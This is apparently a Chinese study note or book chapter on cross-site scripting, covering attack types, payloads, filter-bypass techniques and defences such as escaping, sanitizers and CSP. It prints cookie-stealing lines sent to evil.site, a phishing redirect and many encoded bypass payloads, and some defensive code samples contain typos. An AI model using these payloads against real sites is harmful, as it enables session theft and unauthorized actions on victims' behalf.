# 第六章
# 跨站脚本攻击（XSS）
XSS攻击是客户端脚本安全的头号大敌
## XSS攻击简介
全称Cross-Site Scripting。
由于同源策略的存在，攻击者或者恶意网站的代码没有办法直接获取用户在其他网站的信息。如果攻击者想办法将恶意的JavaScript代码注入到目标网站的页面中执行，就能直接访问到页面上的信息，或者发送请求与服务端交互，达到跨域访问的目的。
XSS本质上是一种注入类型的攻击。当外部恶意代码被注入正常应用的页面后，浏览器无法区分其是应用自身的代码还是外部注入的代码，这些恶意代码拥有和当前页面正常JavaScript脚本一样的权限，如读/写Cookie的权限、读/写页面内容、发送HTTP请求，能实现非常强大的攻击操作，窃取会话凭证信息、读取网页上的敏感数据、以受害者的身份执行恶意操作等。
## XSS攻击类型
### 反射型XSS
反射型XSS攻击是最常见的一种XSS攻击，是指服务端应用在收到客户端的请求后，为对请求中的参数做合法性校验或安全过滤，直接将参数用于构造HTML页面并返回给浏览器显示，如果参数中包含恶意脚本，就会以HTML代码的形式被返回给浏览器执行。因此，这一类攻击被称为"反射型XSS"(Reflected XSS)
最常见的反射型XSS攻击方式是将恶意代码包含在URL参数中，但是攻击者需要诱使用户"点击"这个恶意URL，攻击才能成功。反射型XSS攻击也叫作"非持久型XSS"(Non-Persistent XSS)，因为用于攻击的Payload没有持久存储在服务端应用中，每次实施攻击都需要受害者访问带Payload的URL	
### 存储型XSS
存储型XSS漏洞中，服务端应用将攻击者提交的恶意代码存储在服务端，受害者每次访问一个“干净”的URL时，服务端就在响应页面中嵌入之前存储的恶意代码，这些恶意代码将在受害者客户端执行。由于不需要在受害者的请求中夹带恶意代码，所以这种XSS攻击更稳定，危害性也更大。
存储型XSS攻击通常也叫做“持久性XSS”（Persistent XSS）攻击，恶意代码一旦被植入，在服务端请求恶意代码或修复相关功能之前，攻击效果都存在。
还有一种较为少见的持久性XSS攻击：如果Web应用将Cookie直接输出到HTML页面中，并且攻击者又可以在受害者的Cookie中植入恶意代码（如CRLF漏洞，或者另一个反弹型XSS漏洞写入Cookie），那么这个XSS攻击将持续存在。
### 基于DOM的XSS
前两种XSS攻击类型都与服务端应用的处理逻辑有关系，恶意JavaScript代码在HTTP请求中被视为服务端应用的输入，并且嵌入返回的HTML页面。但是正常应用中的JavaScript程序也可以接收外部输入数据并且直接在客户端渲染和执行，如果处理不当，它就可能将外部数据当作代码来执行。通常是客户端的JavaScript脚本在修改和构造当前页面的DOM节点时触发恶意代码执行，并不是服务端直接返回恶意代码给客户端执行。
DOM型XSS漏洞本质是前端代码漏洞，而不是服务端程序漏洞。攻击这将URL后带上恶意代码，受害者点击链接访问该网站，服务端响应的JS代码存在接收器，在浏览器渲染时执行JS代码，将当前网页的URL写入网页中，从而实现恶意代码注入到网页中并被执行。
扫描DOM型漏洞时，要用到浏览器引擎。
### Self-XSS
早期，攻击者利用社会工程学诱骗用户将含有恶意代码的粘贴到浏览器中，目前浏览器已有响应防范措施。
或者诱骗受害者在控制台中输入恶意代码，由于步骤较多成功率较低。
## XSS进阶
### 初探XSS payload
在前面的示例中，Payload是写在URL中的，为了实现更复杂的攻击逻辑，可以将Payload放在一个JavaScript文件中，然后通过\<script>标签载入，这样就能避免在URL的参数中写入大量的JavaScript代码，例如：
```
http://exampl.com/echo.php?name=<script src="http://evil.site/evil.js"></script>
```
远程引用的网站内含恶意代码
```
var img = new Image();
img.src = 'http://evil.site/log?cookie='+encodeURIComponent(document.cookie);
```
该恶意代码将受害者的Cookie发送给攻击者。
### 强大的XSS payload
"Cookie劫持"并非所有的时候都会有效。有的网站可能在Set-Cookie中给关键的Cookie设置HttpOnly属性；有的网站则会把Cookie与客户端IP绑定。从而使Cookie窃取失去意义。
#### 构造GET和POST请求
Web应用通常通过发送GET请求和POST请求与服务端交互，XSS攻击能实现在受害者浏览器中执行任意JavaScript代码，所以攻击者可以通过JavaScript让受害者发送GET和POST请求来执行Web应用中的功能，如发表博客、在社交网站上关注和点赞等。
通过JavaScript发送GET请求很简单，最简单的方法是创建Image对象，将其src属性指定为目标URL，这样浏览器获取图像时就在当前页面发送了GET请求。
更多的Web应用场景中，执行特定功能的操作是通过POST请求来实现的。使用JavaScript发送POST请求有两种方式能够实现。
对于提交表单的操作，可以使用JavaScript创建一个表单对象，填充表单中的字段，然后提交表单。
```
var form = document.createElement('form');
form.method = 'POST';
form.action = 'http://blog.example.com/del';
document.body.appendChild(form);
var il = document.createElement("input");
il.name = 'id';
il.value = '123';
form.appendChild(il);
form.submit();
```
该方法只能提交表单形式的请求，如果需要提交更复杂的数据格式的请求，就需要用到XMLHttpRequest或Fetch API。如需提交一个JSON格式的数据到服务端，则可以使用如下代码：
```
var xhr = new XMLHttpRequest();
var json = {
    "json":"123"
};
xhr.open('POST','/del');
xhr.setRequestHeader('Content-Type','application/json');
xhr.send(JSON.stringify(json));
```
#### XSS钓鱼
很多论坛和即时聊天软件都有识别可信URL的功能，其基本思路上都是判断URL中的域名是否在已知的白名单列表中，以及阻止发送站外链接。如果一个可信的域名存在XSS漏洞，可以非常简单地通过XSS实现URL跳转。攻击者构造一个可信域名的URL，受害者点击就会跳转到恶意网站。
```
http://example.com//echo.php?name=<script>window.location='http://evil.site';</script>
```
将用户从一个可信网站跳转到一个恶意网站，从而实现钓鱼攻击。
#### XSS攻击平台
XSS攻击能实现非常多的功能，包括获取浏览器的扩展、计算机信息，还能探测开放端口。为了方便研究许多安全研究者将许多功能封装起来做成XSS攻击平台。
`BeEF`是其中一个非常有名的XSS攻击平台，内置的社会工程学模块可以伪造多种不同的登录钓鱼框，用来窃取受害者的账号及密码。
## XSS蠕虫
以往的蠕虫是利用服务端软件或系统漏洞进行传播的。例如17年的WannaCry(永恒之蓝)，利用Windows SMB(TCP 445)服务的漏洞感染可百万用户。
XSS蠕虫利用style属性构造XSS Payload：
`<div style="background:url('javascript:alert(1)')">
通过拆分法绕过对"javascript","onreadystatechange"等敏感词的过滤
通过AJAX构造POST请求添加自己的名字，同时复制蠕虫进行传播。
XSS蠕虫最重要的目的是要实现XSS Payload的自动扩散。XSS蠕虫通过修改当前用户的个人简介，并将XSS Payload插入当前用户的个人简介，当其他用户访问该哦那个户的简介时，XSS Payload就又会被执行。
反射型XSS或DOM型XSS漏洞也能实现XSS蠕虫，但需要受害者点击才能执行。
## XSS攻击技巧
在实际场景中，并不是所有的场景都可以直接嵌入\<script>标签的，需要一些绕过技巧。
### 基本的变形
+ 最简单的变形就是更改字母的大小写。HTML标签对大小写不敏感
+ 如果应用中的过滤函数只是简单地检测参数中有没有\<script>特征，可以通过填充空白字符(空格、制表符、换行)进行绕过：

`<script 
 >alert (document.domain)</script>`
 
+ 可以进行双写绕过简单的删除"\<script>"字符串
`<scr<script>ipt>alert(document.cookie)</script>`
### 事件处理程序
很多HTML节点都可以绑定事件处理程序。
例如：
\<button>：按钮标签，可以绑定点击事件。

\<input>：输入标签，可以绑定多种事件，如输入事件、改变事件等。

\<select>：下拉列表标签，可以绑定改变事件。

\<textarea>：文本区域标签，可以绑定输入事件、改变事件等。

\<a>：超链接标签，可以绑定点击事件。

\<form>：表单标签，可以绑定提交事件。

\<img>：图片标签，可以绑定加载事件、点击事件等。

\<video>：视频标签，可以绑定播放事件、暂停事件等。

\<audio>：音频标签，可以绑定播放事件、暂停事件等。

\<div>：容器标签，可以通过JavaScript绑定各种事件，如点击事件、鼠标移入事件等
例如：
```
<img src=0 onerror="alert(document.cookie);">
<object onerror=alert(document.cookie)>
<input onfocus=alert(document.cookie)>
<video src=0 onerror=alert(document.domain)>
<svg onload=alert(document.domain)>
```
### JavaScript伪协议
浏览器可以接受内联的JavaScript代码作为URL，所以在需要指定URL的标签属性中，可以尝试构造一个 JavaScript伪协议的URL来执行JavaScript代码。
```
<a href = javascript:alert(1)>click me</a>
<iframe src=javascript:alert(1)></iframe>
<form action=javascript:alert(1)>
<object data=javascript:alert(1)>
<button formaction=javascript:alert(1)>click</button>
```
一些安全功能会过滤掉JavaScript伪协议，不过可以尝试在关键词中插入空白字符绕过检测：
```
<a href="javascript&#9:alert(document.domain)">click me</a>
```
有的开发人员在校验URL的合法性时只校验host是否为合法域名，没有校验其协议是否合法。(host字段用来区别同一主机上部署的不同网站，值为：URL:port)，此场景下，可以绕过校验实现XSS攻击。例如：
```
javascript://example.com/%0d%0aalert(1)
```
其中//example.com/会被当作JavaScript代码的注释
PHP中对这个URL使用parse_url来解析，将得到如下结果：
```
arry(3){
    ["scheme"]=>string(10) "javascript"
    ["host"]=>string(11) "example.com"
    ["path"]=>string(12) "/%0d%0aalert(1)"
}
```
当web应用只校验host时，可使用该方式进行绕过，实现XSS
### 编码绕过
网页的不同位置支持不同的编码的方式，如在HTML标签中的属性中可以使用HTML实体编码的祖父。浏览器也可以兼容不标准的编码方式，如缺少分号的数字编码。
大部分的WAF产品都会实现HTML实体编码。为了使可读性更好，在HTML中对很多字符可以使用命名实体编码，如果安全过滤功能不支持实体解码，或只实现了部分字符的解码，则安全过滤功能可能被绕过。比如，HTML5中新增的实体编码。
如果服务端过滤了JavaScript特征代码，可以将关键的代码用Unicode编码，以此绕过检测，如：
```<script>\u0061lert(1)</script>```
如果把Payload放在HTML标签中，还可以将Unicode和HTML实体编码叠加使用，如：
```<img src=0 onerror="&#92u0061lert(1)">```
与此类似，如果Payload是通过JavaScript伪协议的URL插入的，然后又将它用在HTML标签中，这可以对原始的JavaScript代码先做Unicode编码，再做URL编码，然后做HTML实体编码。
```<a href="javascript:alert(document.cookie)">click me</a>```
如果数据在语意上嵌套多层，就可以使用多层编码来尝试绕过检测。WAF类安全产品很难支持不同场景的嵌套解码。
一些不太完善的防御方案，是通过过滤不安全的函数名，或者检测可以的字符串来做攻击检测的。在JavaScript中可以通过动态构造字符串或者使用八进制编码来绕过静态特征过滤
```
<script>eval('al'+'ert(1)');</script>
<script>window['al'+'ert'](1);</script>
<script>window[String.fromCharCode(97,108,101,114,116)](1);</script>
<script>window[atob("YWxlcnQ=")](1);</script>
<script>top[`al`+`ert`](1);</script>
<script>top['\141\154\145\162\164'](1);</script>
```
### 绕过长度限制
很多时候产生XSS漏洞的地方对变量的长度会有限制。
假如以下代码存在一个XSS漏洞：
`<input value="$var" />`
攻击者可能会构造如下payload：
`?var=""><script>alert(/xss/)</script>`
过长会导致被切割，可以利用事件来减少所需要的字节数：
`?>var="onclick=alert(1)//`
该方法效果有限
一个完整的URL地址的格式为：
`协议://主机:端口/路径名称?搜索条件#hash标识`
如果页面中含有锚点连接，可以使用hash标志指定页面中的锚点标志，该标志以“#”开头
最常用的"藏代码"的地方是"location.hash"。根据HTTP协议，location.hash的内容不会在HTTP请求中发送，所以服务端的Web日志并不会记录location.hash里的内容，从而隐藏攻击者的真是意图。
`?var=" onclick="eval(loaction.hash.substr(1))`
因为location.hash的第一个字符是"#"，所以必须删除第一个字符，因此构造XSS URL为：
`http://example.com/test.php?var="
onclick="eval(location.hash.substr(1))#alert(1)`
`http://localhost/vulnerabilities/xss_r/?name=</pre><script>eval(location.hash.substr(1))</script>#alert(/long long javascript/)`
将该链接发送给受害者，JS代码会根据location.hash.substr(1)来执行#后的代码(反射型XSS)

某些情况下，一个页面中多处变量的值可以通过多个不同的参数控制，如果每个变量都有限制，可以尝试将多个变量拼接成长的Payload。
假设页面中输出3个变量：
```
<input name="name" value="$name">
<input name="email" value="$email">
<input name="phone" value="$phone">
```
通过注释符来“吃掉”页面中已有的其他内容，以保证代码语法正确。
`?name="><script>/*$email=*/alert(document.cookie)/*$phone=*/</script>`
满足三个参数都有值，且不会被分隔到三个标签中,在代码中如下：
```
<input name="name" value="><script>/*">
<input name="email" value="*/alert(document.cookie)/*">
<input name="phone" value="*/</script>">
```
### 使用\<base>标签
\<base>标签并不常用，其作用是定义上的所有使用“相对路径”标签的host地址。
例如在\<img>标签前加入一个\<base>标签：
```
<base href="https://www.google.com"/>
<img src="/intl/en_ALL/images/srpr/logolw.png"/>
```
存在多个base标签时，只有第一个base标签能够有效
相当于将https://www.google.com拼接到/intl/en_ALL/images/srpr/logolw.png前
如果攻击者构造\<base>标签就能够劫持当前页面上所有使用"相对路径"的标签。
防御时，一定要过滤该标签
### window.name的妙用
window.name属性可以实现跨域数据传输。从一个域跳转到另一个域时，该属性的值不会发生变化。在当前页面中将较长的Payload写在window.name属性中，然后跳转到下一个页面，将这个Payload读取出来执行，就可以实现Payload的跨域传输。
假如在example.com上存在一个XSS漏洞可以执行JavaScript代码，那么在恶意网站evil.site上可以构造如下代码：
```
<script>
    window.name="alert(document.domain)";
    window.location="http://example.com/xss.php";
</script>
```
window.name的恶意代码可以被带过来。
example.com只需通过XSS执行如下代码即可：
`eval(name);`
有的浏览器安全机制会将window.name的值清空，但这个安全机制仅在顶层窗口发生跳转时起作用，当iframe的页面跳转时并不会清空。可以将恶意代码嵌入iframe标签中
如下所示：
```
<iframe src="http://example.com/xss.php" name="alert(document.domain)"></iframe>
```
也可以通过点击打开新页面，指定window.name的值：
```
<a href="http://example.com/xss.php" target="alert(document.cookie)">click me</a>
```
##  JavaScript框架
利用JavaScript开发框架可以快速而简洁地完成前端开发。但是开发者使用不当，也可能会产生XSS漏洞。一般来讲，使用JavaScript框架产生的XSS漏洞都是DOM型的
### jQuery
曾经最为流行的JavaScript框架，本身漏洞很少。jQuery中有一个html()方法，如果没有参数，该方法就读取一个DOM节点的innerHTML；如果有参数就会把参数值写入DOM节点的innerHTML。在这个过程就会产生DOM型XSS漏洞。比如：
`$('div.demo-container').html("<img src=# onerror=alert(1)>");`
$ 符号是 jQuery JavaScript 库中的一个函数或对象。它是一个 JavaScript 函数，用于选择 HTML 元素、操作 HTML 元素和执行其他 JavaScript 操作。
这段代码是使用jQuery选择器选择所有class为"demo-container"的div元素，然后使用.html()方法将其内容替换为一个img元素。
innerHTML在JS是双向功能：获取对象的内容 或 向对象插入内容；
例如：

`document.getElementById("myDiv").innerHTML += "<p>This is a new paragraph.</p>";//增`
`document.getElementById("myDiv").innerHTML = "Hello, world!";//改`
`document.getElementById("myDiv").innerHTML = "";//删`
`var content = document.getElementById("myDiv").innerHTML;//查`
### Vue.js
Vue.js是目前最流行的JavaScript开发框架之一，核心是允许采用简洁的模板语法来声明式地将数据渲染到DOM的系统。通常情况下，使用模板渲染前端页面的系统在安全性上会更强健，比如下面的模板：
`<h1>{{userProvidedString}}</h1>`
渲染引擎会确保userProvidedString变量经过了HTML转义输出，即使其中包含了\<script>标签也能将其变成安全的内容。
但是如果构造模板时接受了不安全的输入，就能引入并执行外部JavaScript代码，也即能造成XSS攻击，例如：
```
new Vue({
    el:'#app',
    template:`<div>`+userProvidedString+`<div>`
});
```
模板注入攻击，需要确保信息来源的安全可信。
**简单使用**
```
...
<div id='app'>
    <p>{{ message }}
</div>
...

<script src="https://unpkg.com/vue@3/dist/vue.global.js"></script> //引入Vue框架
<script>
    var app= new Vue({
        el:'#app', //指定实例控制的DOM元素，el和data都是Vue的实例属性
        data:{    //数据对象
            message:'hello Vue'
        }
    });    
    app.message = 'Hello Vue updated!';
</script>
```

### AngularJS
AngularJS是Google推出的一款功能强大的前端开发框架，其自身安全性非常高，但在特殊情况下会，它可能给一个安全的程序带来XSS漏洞。
如以下代码将外部输出变量q做了HTML转义再输出。正常情况下是安全的：
```
<html>
<body>
<?php echo htmlspecialchars($_GET['q'],ENT_QUOTES);?>
</body>
</html>
```
但是引入AngularJS后变得不安全了：
```
<html ng-app>
<body>
<script src="https://code.angularjs.org/1.8.2/angular.min.js"></script>
<?php echo htmlspecialchars($_GET['q'],ENT_QUOTES);?>
</body>
</html>
```
通过对参数q的值进行构造即可实现模板注入
`q={{construtor.constructor('alert(document.domain)')()}}`
### Django
### Flask
### React
### Spring
## XSS攻击的防御
### HttpOnly
Cookie具有HttpOnly属性，让客户端JavaScript代码不能读取Cookie，但是HTTP请求还是会发送Cookie，保证了存在XSS漏洞时不会泄漏会话的Cookie。
`session.cookie_httponly=On //PHP的配置文件中可以开启会话的HttpOnly属性`
```
from django.http import HttpResponse    //python设置Cookie
 response = HttpResponse("Hello, world!")
 response.set_cookie('myCookie', 'myValue', httponly=True)
```
### 输入过滤
 常见的web安全漏洞，攻击者都会构造一些特殊字符，这些特殊字符可能是正常用户不会用到的，所有有必要检查和过滤输入的参数。
 输入过滤在很多时候也被用于检查格式。
 输入过滤的逻辑必须放在服务端代码中实现。常见的做法是同时在客户端JavaScript代码和服务端代码中实现相同的输入检查。
 输入过滤一般是过滤掉特殊字符或者对其编码。比较智能的"输入过滤"可能还会匹配XSS的特征，过滤掉敏感字符。该过滤方式可以称为“XSS Filter”
 XSS Filter在用户提交数据时获取变量，并进行XSS检查，但此时用户数据并没有与渲染页面的HTML代码结合，因此XSS Filter对语境的理解并不完整。
 在大多数的情况下，URL是一种合法的数据。
 XSS Filter如果只是简单地对特殊字符进行过滤，可能会该改变数据的语义。
 现代应用框架默认不做输入过滤和转义，但是对于格式非常明确的参数值，对输入进行检查或者强制转换是有必要的，比如邮箱地址、年龄、日期等字段，在一开始就校验数据格式的合法性，会让应用有更高的健壮性。
### 输出转义
既然参数在输入是做全局过滤和转义存在各种问题，那么就应该在输出变量时根据不同的场景有针对性地编码或转义。
#### HTML页面中转义
常见的变量输出场景应该是该变量用于构造HTML页面，分两种情况：变量作为HTML标签的属性值，另一种是变量作为标签的内容。
```
<input name="name" value="$value"> //变量作为属性值
<p>$value</p> //变量作为标签内容
```
当变量作为属性值时，必须对传入内容中包含的 " 和 ' 进行转义,防止提前闭合。
`" onclick="alert(1)`
当变量作为标签内容时，必须让变量以文本形式显示，而且不能引入其他HTML标签。
`<script>alert(1)</script>`
会被嵌入JS代码，因此需要对 > 和 < 进行转义，避免产生新的标签
因为HTML转义是将字符转换成`&xx;`的格式，如果原始内容就包含`&xx`，就会导致内容发生变化，因此必须对`&`进行转义。
总的来说，需要对`"`,`'`,`<`,`>`,`&`进行HTML转义。
PHP中可以使用htmlsepcialchars()或者 htmllentities()函数来转义，这两个函数都需要指定ENT_QUOTES才能将单引号转义。
HTML标签的属性一定要用双引号或单引号包围，虽然能被正常解析，但是容易被直接拼接发生注入攻击。
#### JavaScript中的字符串转义
另外一个非常常见的场景是将变量输出到\<script >标签的代码中。
```
<script>
    var name='$v';
</script>
```
需要对输入的`'` 进行` \ `转义，但是会被绕过，因此需要对 \ 自身进行转义
另外需要对`/`进行转义，
当输入内容为：
`</script><script>alert(1)</script>`
输出的内容如下：
```
<script>
    var name='</script><script>alert(1)</script>';
</script>
```
虽然第一个\<script>标签是错误的，但不影响第二个script标签中的代码，注入的代码能正常执行。
有些安全方案会将<和 >字符用Unicode转义，也可以避免script标签提前闭合。
输出到JavaScript的字符串，需要对`'`,`"`,`\`,`/`进行转义。更为安全的方案是采取白名单机制，只保留英文字母、数字、点号等字符，对其他字符全部采取Unicode转义。
变量一定要用引号括起来，不然上述防御措施就会失效。
在JS代码中输出变量本就是不安全的做法，没有遵循代码和数据芬琳的安全原则，而且实施CSP时比较麻烦。更加安全的做法是使用HTML标签 "data-*"属性来保存数据，在JavaScript中需要用到数据时就从DOM节点中读取。以下是简单用法：
```
<div id="UserInfo" data-name="$name" data-gender="$gender"></div>
<script>
    var userInfo = document.getElementById('UserInfo');
    alert(userInfo.dataset['name']);
    alert(userInfo.dataset['gender']);
</script>
```
该方案只需要对数据进行HTML转义，然后将其存放在节点属性中，在JavaScript代码中不存在任何变量输出，所以将这段代码从HTML页面中剥离出来放在单独的.js静态文件中，这对实施CSP非常有帮助
#### 伪协议
在支持URL的HTML标签属性中，如果对URL的合法性校验不充分，可能导致XSS漏洞。
例如：
`<a href="$v">click me</a>`
如果$v变量是一个JavaScript伪协议的URL，比如：
`javascript:alert(1)`
即使做了HTML的转义输出，还是会触发XSS代码，类似的还有firame的src属性、form的action属性。
对于 外来输入的URL，需要严格校验其是否以“HTTP”、“HTTPS”或“/”开头。对HTML标签的属性值做HTML转义并用引号括起来是必不可少的
对window.location对象赋值时，使用JavaScript伪协议的URL也可造成XSS攻击，此类场景也需要校验URL的合法性。
还有一中以Data URL的协议，以`data:`开头，用于在HTML页面中嵌入资源。一些小的资源可以用Data URL直接嵌入。其语法：
`data:[<mediatype>][;base64],<data>`
mediatype用于指定资源类型和字符集，因为Data URL通常用于嵌入二进制数据，所以它支持Base64编码。在一些支持Data URL的标签中可以嵌入XSS Payload的 Data URL
```
<iframe src="data:text/html;base64,<base64_String>"</iframe>
```
其他支持Data URL的场景还有lobject标签的data属性、script标签的src属性、JavaScript中import函数导入的内容。因为此类场景的安全检测非常麻烦，所以最好不要接收外部输入的参数。
#### 嵌套场景
之前的场景都是单一地变量被输出到HTML或者JavaScript字符串中，在HTML事件属性中，这两个场景同时存在。例如：
`<body onload="init('$v')">`
$v即是JavaScript代码中的init函数的参数，又是body中onload属性，在该例子中，仅做HTML转义，或者仅做JavaScript转义，都会存在安全问题。
当应用仅做HTML转义，如果$v的值为：
`');alert(1);//`
输出结果是：
`<body onload="init('$#039;);alert(1);//')">` 
在浏览器中，是先对HTML代码进行解析再对JavaScript代码进行解析。经过HTML解析后，onload属性的内容如下：
`init('');alert(1);`
这样就注入并执行了JavaScript恶意代码。
只做JavaScript代码转义，构造如下值：
`"><script>alert(1)</script>`
服务端经过HTML渲染后代码如下：
`<body onload="init('\"><script>alert(1)</script>')">`
因为优先解析HTML代码，所以还没轮到`\`转义，双引号已经将onload闭合了，之后就是闭合body标签再插入script代码。这样就执行了代码。
正确做法是将其作为JavaScript代码进行JavaScript转义，再将其作为HTML标签属性，进行HTML转义。
**在什么场景就用用该场景对应的 转义方法。XML数据，就先对其做XML转义，再对其进行URL编码，在对其做HTML编码将其填到标签属性中。**
#### 默认输出转义
输入转义成了web应用的标准XSS防御方案，所以很多web应用框架都默认做输出转义。在MVC框架中比较容易实现，HTML输入都是在View层实现的，通过模板很方便地对默认变量默认做转义输出。比如：
`<input name="name" value="{{value}}">`
但是，变量在输出时需要根据不同场景做不同的转义的，而模板引擎并不能只能判断输出场景。如果对所有变量输出采取同一种转义方式(模板引擎一般默认做HTML转义)，还是会存在安全问题。
即使使用了模板引擎，还是建议遵循代码与数据分离的原则，即在模板中只渲染HTML内容。绝大多数的模板引擎也只是针对HTML场景设计的，所以尽量不要让JavaScript代码通过模板渲染输出。
MVC（Model-View-Controller）是一种软件设计模式，用于组织和管理应用程序的代码。它将应用程序分为三个主要部分：模型（Model）、视图（View）和控制器（Controller）。

+ 模型（Model）：模型表示应用程序的数据和业务逻辑。它负责处理数据的存取、验证和处理业务逻辑。模型通常包含数据库操作、数据校验、业务逻辑等功能。
+ 视图（View）：视图负责展示模型中的数据给用户，并接收用户的输入。它通常是用户界面的一部分，负责显示数据、接收用户输入和与用户进行交互。
+ 控制器（Controller）：控制器是模型和视图之间的中间层，负责协调模型和视图之间的交互。它接收用户的输入，更新模型的数据，并将最新的数据传递给视图展示给用户。控制器还可以处理用户的请求，调用适当的模型方法进行数据处理。
#### 不可忽视的Content-Type
在HTTP响应中，Content-Type头用于向浏览器指示返回的数据是什么类型(MIME)，如果服务器没有响应正确的Content-Type，即使做了相应的转义操作，仍可能产生XSS漏洞。
例如下面输出JSON的场景：
```
<?php 
$name = $_GET['name'];
$age = $_GET['age'];
echo json_encode(arry('name'=>$name,'age'=>$age));
?>
```
因为json-encode函数会做相应的转义，以确保输出数据的JSON是合法的，不存在引号提前关闭的问题，如果参数存在`'`和`\`时输出了合法的JSON数据：
`{"name":"LaoWang\"'\/\\","age":"80"}`
但是PHP中默认相应的Content-Type时text/html，构造如下name参数值时：
`<img src=0 onerror=alert(1)>`
浏览器还是会将该值当作HTML来解析，还是会造成攻击成功。
指定Content-Type为application/json才能避免。
JSONP的callback参数通常是从客户端输入的，本质上是返回一段JavaScript代码，所以要将Content-Type设为application/javascript
旧版本的IE提供了Content sniffing功能，会根据内容其尝试探测其格式，攻击者上传内嵌HTML代码的图片，也会导致其执行，新版IE修复了其缺陷，允许服务器通过X-Content-Type-Options：nosniffing来关闭该功能。
#### 处理富文本
有时候，网站需要允许用户提交一些自定义HTML代码(称为"富文本")。例如用户论坛里发帖，帖子中有图片、链接、表格等。这些"富文本"效果都需要通过HTML代码来实现。
因为富文本包含了各种HTML标签，所以输出转义是不行的(输出转义只会将代码当作文本显示，而不会执行代码得到跳转等效果)。还是进行"输入过滤"。安全地处理 富文本要达到的目的是：保证安全的标签和属性，过滤恶意的标签和属性。
过滤富文本时，首先要过滤掉危险的标签，比如:\<iframe>,\<script>,\<base>、\<form>等应被严格禁止，"事件"应该被严格禁止，因为富文本的展示需求里不应该包括“事件”这种动态效果。
在标签选择上，应该使用白名单，避免使用和名单。比如，只允许\<a>，\<img>，\<div>等比较安全的标签存在。
处理网页样式也是一件麻烦事。如果允许用户自定义CSS，则可能导致XSS攻击。
例如：
```
<style>
  .user-input {
    background-image: url("javascript:alert('XSS')");
  }
</style>
```
要尽可能地禁止用户自定义CSS。如果允许，则只能像过滤"富文本"一样过滤CSS代码。这需要用CSS解析器对样式进行智能分析，检测其中是否包含危险代码。
有一些成熟开源项目能够实现对富文本的安全过滤。OWASP HTML Sanitizer是一个开源Java项目，能够有效，灵活实现对HTML安全过滤。
例如：
```
PolicyFactory policy = new HtmlPolicyBuilder()
        .allowElements("a")
        .allowAttributes("href").onElements("a")
        .requireRelNofowllowOnLinks()
        .toFactory();
String safeHTML = policy.sanitize(unstructedHTML);
```
PHP中有Purify，python中有bleach。
#### 防御DOM型XSS
DOM型XSS漏洞是一种比较特别的漏洞，前面的防御方法啊都不适用(不涉及到与服务端的数据传输，服务端无法进行数据过滤)。DOM型XSS的例子：
```
<div id="URL"></div>
<script>
    document.getElementById('URL').innerHTML = decodeURI(location.href);
</script>
```
这里产生DOM型XSS漏洞的关键地方是innerHTML属性的赋值操作--将外部数据未经安全处理就注入到当前DOM。所有DOM型XSS都是因为前端代码在操作数据时引入恶意代码而产生的。
```
<div id="URL"></div>
<script>
    var x = '$v';
    document.getElementById('URL').innerHTML = x;
</script>
```
为了避免$v变量产生XSS漏洞，服务端在输出时对其进行了JavaScript转义，所以这条语句是正确的，但是下一行将其赋值给DOM节点的innerHTML时，仍能产生XSS漏洞：
```
<div id="URL"></div>
<script>
    var x = '<img src=0 onerror=\'alert(1)\'>;
    document.getElementById('URL').innerHTML = x;
</script>
```
因为该段代码变量输出属于JS代码部分，因此服务端只会进行JS转义，而不会对其做HTML转义，一旦将该值赋值给URL标签后，就会变成HTML标签部分，因为没有进行HTML转义，该代码会被执行。
因此，需要对输出到HTML页面的数据进行HTML转义，只不过是在前端JavaScript代码中实现：
```
<div id="URL"></div>
<script>
    function escapeHtml(unnsafe){
        return unsafe
            .repalce(/&/g,"&amp;")
            .repalce(/</g,"&lt;")
            .repalce(/>/g,"&gt;")
            .repalce(/"/g,"&quot;")
            .repalce(/'/g,"&#039;")
             }
     var x = '$v';
     document.getElementById('URL').innerHTML = escapeHtml(x);
</script>
```
同样如果在JavaScript中将变量拼接成HTML标签的属性，也需要在前端对变量做HTML转义后再将其拼接到属性中，如：
```
<div id="URL"></div>
<script>
    function escapeHtml(unsafe){
        reuturn unsafe
            .replace(/&/g,"$amp;")
            .replace(/</g,"&lt;")
            .replace(/>/g,"&gt;")
            .replace(/"/g,"quot;")
            .replace(/'/g,"&#039;");
    }
    function escapeJs(unsafe){
        return unsafe
            .replace(/\\/g,"\\\\")
            .replace(/"/g,"\\\"")
            .replace(/'/g,"\\\'")
            .replace(/\//g,"\\/");
    }
    var v = '<?php echo $v?>';
    document.getElementById('URL').innerHTML = '<img src=0 onerror="console.lg(\''+escapeHtml(escapeJs(v))+'\');">';
</script>
```
可以看到，在JavaScript中输出HTML内容，与服务端输出HTML内容要做的安全方案是类似的，都是根据语境做相应的转义后再输出到页面中，只不过前者是在JavaScript代码中完成转义操作。
会触发DOM型XSS漏洞的场景有很多，最常见的方法就是`直接向DOM中输出HTML代码`，下面是几个常见的输出HTML内容的方法：
`document.write()、document.writeln()、element.innerHTML()=、element.outerHTML=、element.insertAdjacentHTML=`
以上都是原生的JavaScript方法，但是很多前端JavaScript框架对这些方法进行了封装，如果使用不当也会造成DOM型XSS漏洞。例如：jQuery的html()、append()、prepend()等很多支持HTML字符串源码的方法都允许向页面插入DOM节点，在使用时也需要注意。
上面这些产生DOM型XSS漏洞的原因都是用字符串来构造DOM节点，从安全的角度来说，这是不推荐的做法。在大多数场景中，我们只需要修改DOM节点的文本内容，其实可以使用更安全的`element.textContent`对象来赋值。
现代JavaScript框架都提供了更安全的操作DOM的方式，应当避免直接操作innerHTML。例如，React框架将操作innerHTML的方法命名为dangerouslySetInnerHTML，以提示开发者在使用过程中注意其危险性。
如果前端存在`动态构造代码并执行`的场景，也需要注意构造代码过程中的安全性。如果存在外部输入，可能导致DOM型XSS漏洞，例如下面的JS函数：
`eval()、setTimeout()、setInterval()、Function()构造函数`
对`关键变量赋值`也可能存在安全问题，如window.location对象的值受外部变量控制时，攻击者可以使用JavaScript伪协议来执行恶意代码；document.domain属性值受外部变量控制时，其他子域名的应用可以把自己修改成与目标网站同源，从而绕过同源策略。
攻击者要利用DOM型XSS漏洞，需要通过应用自身的JavaScript代码向应用注入外部恶意代码。常见的外部输入如下：
`window.location、document.URL、document.documentURI、document.baseURI、document.referrer、window.name`
上述属性的读/写操作也是前端代码安全审计关注的重点，JS代码在获取这些数据用于应用的内部逻辑时，需要把它们当作不可信的外部数据，进行严格校验或过滤后才能使用。
#### 内容安全策略（CSP）
XSS攻击的本质是web应用被注入了外部的不可信JavaScript代码，而浏览器没有办法区分其是安全应用自身的代码还是外部的代码。内容安全策略(content scurity policy)CSP的作用正是将自身JavaScript代码和外部代码区分开。
